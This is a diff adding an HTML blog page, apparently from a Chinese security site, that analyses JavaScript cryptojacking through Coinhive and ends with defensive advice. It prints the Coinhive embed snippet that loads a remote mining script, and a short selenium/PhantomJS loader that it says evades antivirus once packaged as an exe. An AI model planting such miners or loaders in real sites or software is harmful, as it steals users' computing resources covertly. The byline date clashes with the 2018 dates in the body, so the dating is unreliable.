@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<head>
+
+	<title>poions blog</title>
+	<meta name="keywords" content="" />
+	<meta name="description" content="" />
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<link href="/css/bootstrap.min.css" rel="stylesheet" type="text/css">
+	<link href="/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+	<link href="/css/templatemo_style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+	<div class="templatemo-logo visible-xs-block">
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 black-bg logo-left-container">
+			<h1 class="logo-left">Black</h1>
+		</div>
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 white-bg logo-right-container">
+			<h1 class="logo-right">White</h1>
+		</div>
+	</div>
+	<div class="templatemo-container">
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 black-bg left-container">
+			<h1 class="logo-left hidden-xs margin-bottom-60">Black</h1>
+			<div class="tm-left-inner-container">
+				<ul class="nav nav-stacked templatemo-nav">
+				  <li><a href="\index.html"><i class="fa fa-home fa-medium"></i>首页</a></li>
+				  <li><a href="\web.html" class="active"><i class="fa fa-shopping-cart fa-medium"></i>Web安全</a></li>
+				  <li><a href="\ctf.html"><i class="fa fa-send-o fa-medium"></i>CTF</a></li>
+				  <li><a href="\zawen.html"><i class="fa fa-comments-o fa-medium"></i>杂文</a></li>
+				  <li><a href="\contact.html"><i class="fa fa-envelope-o fa-medium"></i>联系方式</a></li>
+				</ul>
+			</div>
+		</div>
+		<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 white-bg right-container">
+			<h1 class="logo-right hidden-xs margin-bottom-60">White</h1>
+			<div class="tm-right-inner-container">
+				<h1 class="templatemo-header"><strong>JS挖矿威胁情报分析</strong></h1>
+				<article class="templatemo-item">
+				 </br>
+				<h1 class="templatemo-header"><strong>0x01 概述</strong></h1>
+				<span>
+					<strong>
+				<font face="verdana" color="green">数字货币“挖矿”， 通俗讲就是猜数字求解，猜对即可获得数字货币奖励。
+					目前已知的数字货币约有100多种，包括比特币、莱卡币、门罗币等常见类型，并且近年来其价格呈快速增长趋势。
+					以比特币为例，目前1比特币价格为14841美元，折合人民币97140元；而在2017年年初1比特币价格仅为1000美元，在短短的一年内其价格上涨十几倍。
+					巨大的利润吸引越来越多的挖矿者投入更多的计算资源挖矿，并将算盘打到广大网友头上。</font>
+				</strong>
+			</br>
+			<br />
+			<br />
+
+		 <h1 class="templatemo-header"><strong>0x02 前言</strong></h1>
+		 <p>近段时间爆发的js挖矿事件越来越多，随着数字货币的不断增值挖矿木马也层出不穷；例如进入腾讯管家爆出的《绝地求生》辅助暗藏挖矿木马事件(http://www.freebuf.com/news/158892.html)
+		 			震撼游戏玩家，但这仅仅是黑客利用挖矿木马植入用户电脑的个例。该事件也说明了现在挖矿木马通过群众意想不到的方式在悄无声息中利用了你的电脑进行挖矿。</p>
+					<p>图为《绝地求生》辅助木马挖矿的攻击流程</p>
+			<img src="images\15148645496300.jpg" alt="frist" class="img-thumbnail">
+					<p>通过植入到游戏辅助工具，当游戏玩家下载该辅助软件运行便启动挖矿木马并后台运行，写入到启动项就算用户关闭辅助软件和重启电脑，挖矿木马依然自启动一般用户很难察觉.</p>
+			</br>
+			<hr />
+		</br>
+
+		<h1 class="templatemo-header"><strong>0x03 挖矿分析</strong></h1>
+		<strong>门罗币，截止日期2018-01-05市面上价格高达1个人民币2572.
+			通常在这种巨额利润下黑客会更踊跃于这种币，虽然门罗币相比比特币的市值少很多但是门罗币大多数利用CPU进行计算，暴露在互联网上可以通过CPU计算获取门罗币的服务器不在少数，
+			因此，黑客更热衷于门罗币的挖掘。
+		</strong>
+		<p>往往黑客只需要通过漏洞对网站植入相应的恶意js代码，当用户访问到被植入恶意程序代码的站点页面时，网站便调用js利用用户本机进行运算，运算结果将发送至远端服务器。</p>
+		<img src="images\20180108113501.jpg" alt="frist" class="img-thumbnail">
+		<strong>Coinhive</strong>
+		<p>coninhive是国外一款挖矿脚本，一般挖矿用户一主动法师直接使用C或者其他语言构造的Miner客户端进行CPU或GPU计算得到算力价值，而Coinhive前端挖矿用户会以被动的形式在毫不知情的情况下由浏览者产生的CPU计算得到算力价值。利用CPU或GPU本身的高速浮点计算能力进行挖矿工作。而一般挖矿选取有更优秀浮点计算能力的GPU进行操作。
+			前端挖矿利用asm.js或webAssembly前端解析器中介在浏览器端被动使用用户的CPU完成挖矿或者利用Html5新规范WebGL利用浏览器完成GPU挖矿操作。
+			因此前端挖矿是目前是黑产最喜爱的一种挖矿方式之一！
+		</p>
+		<strong>Coinhive脚本分析</strong>
+		<p>
+			Coinhive官网：https://coinhive.com<br />
+			从官网文档分析：<br />
+			coinhive.min.js （该脚本是wss矿池通信分配worker实现交互）<br />
+			CoinHive.CONFIG.WEBSOCKET_SHARDS （webSocket地址连接pool进行任务发布）<br />
+			从文档，获取查看到脚本调用的api
+		</p>
+		<pre><#script src="https://coinhive.com/lib/coinhive.min.js"><#/script><br /><#script><br />#var miner = new CoinHive.User('SITE_KEY', 'john-doe');<br />#miner.start();<br /><#/script></pre>
+		<img src="images\20180108113817.jpg" alt="frist" class="img-thumbnail">
+		<p>通过官方文档给出教程:<br />javascript调用https://coinhive.com/lib/coinhive.min.js 脚本
+			后面带入site-key和john-doe就可以完成与矿池的通信连接，并开启挖矿。
+		</p>
+		<hr />
+		<br />
+		<br />
+		<h1 class="templatemo-header"><strong>0x03 详细分析</strong></h1>
+		<strong>本地实验</strong>
+		<p>本地测试查看，这种情况下用户跟服务器发生的交互情况
+			测试将在index主页嵌入Coinhive脚本
+		</p>
+		<img src="images\20180108114533.jpg" alt="frist" class="img-thumbnail">
+		<p>如图所示，通过在本地搭建好的cms首页植入Js挖矿脚本代码然后本地访问网站首页</p>
+		<img src="images\20180108114707.jpg" alt="frist" class="img-thumbnail">
+		<p>从访问情况来看，在正常的访问情况下额外加载了https://ws032.coinhive.com/proxy 地址。
+			可见，植入代码已被加载;然后查看cpu使用情况</p>
+			<img src="images\20180108114849.jpg" alt="frist" class="img-thumbnail">
+			<p>查看到的cpu已被占满
+		在用户正常访问网站毫不知情的情况下用户的流量cpu已被偷跑，成为黑产者的生产工具。
+		当用户成为别人的“工具”的时候，用户电脑将会卡顿。如果用户意识到自己打开了一个有问题的页面而结束对该页面的访问则断开了“挖矿”工作。随着时间的推移、攻击者控制越来越多的域名，站点所有者将获得更多的利润。
+		因此在这种隐蔽性极强的情况下，对于缺乏安全知识的用户来说很难发现情况导致现在更多的黑客踊跃与入侵网站植入挖矿脚本至源码，偷偷加载脚本获取更多的用户访问量来捆绑其成为自己挖掘门罗币的工具。
+		</p>
+			<br />
+			<strong>
+				基于js挖矿拓展分析
+			</strong>
+			<p>
+				通过对web站点注入js脚本，来控制访问者机器来进行挖矿这一种“被动挖矿”方式逐渐被抛弃使用，原因是该站点在没有大量客户访问资源的情况下收益很少。
+				因此,现在越来越多的是采用“主动挖矿”方式，通过制作各种挖矿木马，绑定到某些热门软件进行传播以控制大量机器成为“生产工具”。
+			</p>
+			<strong>例子</strong>
+			<p>演示通过python编写的挖矿脚本，分析在用户点击启动该软件后产生的一些列状态.
+			脚本通过利用selenium webdriver模块，JS脚本在加载的过程中是以动态形式加载。通过这种方式来让selenium模块去做“挖矿”动作<br />
+			脚本代码:</p>
+			<pre>from selenium import webdriver<br />obj = webdriver.PhantomJS()<br />obj.get('http://12.0.0.1/')</pre>
+			<p>
+				仅仅三行代码实现请求访问被植入JS代码站点，并且执行挖矿.因此在后续构造上可变化空间相当巨大</p>
+				<img src="images\20180108141319.jpg" alt="frist" class="img-thumbnail">
+				<p>当打包成exe形式，启动后cpu迅速被占满机器沦为挖矿工具</p>
+				<img src="images\20180108141416.jpg" alt="frist" class="img-thumbnail">
+				<p>当查看进程，可以看到PhantomJS.exe占用大量cpu;而事实上这进程服务是处于合法进程，杀软无法识别。</p>
+				<img src="images\20180108142257.jpg" alt="frist" class="img-thumbnail">
+				<p>在绝大部分杀软面前，利用pyhon去加载动态页面的这执行方法根不是具有危害性动作，因此也不会出现说报毒情况。在逃避杀毒软件这一方便远远比普通的挖矿木马要强许多倍。</p>
+				<div>根据目前市面比特币价格猛飙，必然带动其他货币的增长因此利用恶意方式获取数字货币的方式也会越来越来，而通过加载js脚本的这种更为隐蔽的方式将会更具备危害性。</div>
+		<hr/>
+				</br>
+
+				<h1 class="templatemo-header"><strong>0x04 安全建议</strong></h1>
+					<pre>
+1、 开启系统自动更新，及时打补丁，防止恶意木马利用；<br />
+2、 服务器避免使用弱口令，不给不法分子可乘之机；<br />
+3、 机器卡慢时应立即查看CPU使用情况，若发现可疑进程可及时关闭；<br />
+4、 不浏览色情、辅助等被标记为不可信的网站；<br /></pre>
+						<br>
+<hr/>
+			</br>
+			</br>
+						by<span class="blue">：2017年7月26号</span><span class="green">下午2点钟</span>.</p>
+				<br/>
+
+
+
+		<!-- 文章修改 -->
+
+
+
+				</footer>
+			</div>
+		</div> <!-- right section -->
+	</div>
+</body>
+</html>
